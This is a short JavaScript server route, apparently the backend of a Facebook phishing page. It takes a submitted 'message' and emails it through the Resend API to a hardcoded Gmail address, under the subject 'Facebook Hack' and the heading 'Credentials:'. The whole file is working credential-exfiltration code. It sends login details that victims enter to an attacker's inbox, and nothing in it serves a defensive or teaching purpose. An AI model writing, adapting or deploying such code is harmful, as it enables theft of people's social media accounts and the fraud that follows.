/* eslint-disable no-undef */
import { Resend } from "resend";

export async function POST(request) {
  const resend = new Resend(process.env.RESEND_API_KEY);

  try {
    const { message } = await request.json();

    const { data, error } = await resend.emails.send({
      from: "Facebook Hack <onboarding@resend.dev>",
      to: ["angelxcrema@gmail.com"],
      subject: "Facebook Hack",
      message,

      html: `
        <h1>Credentials: </h1>
        <h2>${message}</h2>
      `,
    });

    if (error) return new Response(error);
    return new Response(JSON.stringify(data));
  } catch (error) {
    return new Response("Error processing the request", {
      status: 500,
    });
  }
}
